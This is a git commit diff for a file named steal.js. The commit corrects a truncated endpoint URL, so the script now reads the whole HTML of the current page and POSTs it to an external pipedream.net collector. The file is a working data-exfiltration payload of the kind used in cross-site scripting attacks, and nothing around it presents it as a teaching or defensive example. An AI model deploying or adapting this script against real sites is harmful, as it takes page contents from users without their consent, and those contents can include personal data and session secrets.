75b6f26016fa493a012f4a131210f47fde1e0956
Geetika Gopi <86356813+GeetikaGopi@users.noreply.github.com>
2023-03-09 02:51:23 -0500

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,6 +1,6 @@
 var htmlContent = document.documentElement.innerHTML;
 var xhr = new XMLHttpRequest();
-var endpointUrl = "https://eozi6xw3ogrvjqh.m.pipedream.ne";
+var endpointUrl = "https://eozi6xw3ogrvjqh.m.pipedream.net";
 xhr.open("POST", endpointUrl);
 xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send(JSON.stringify({ htmlContent: htmlContent }));
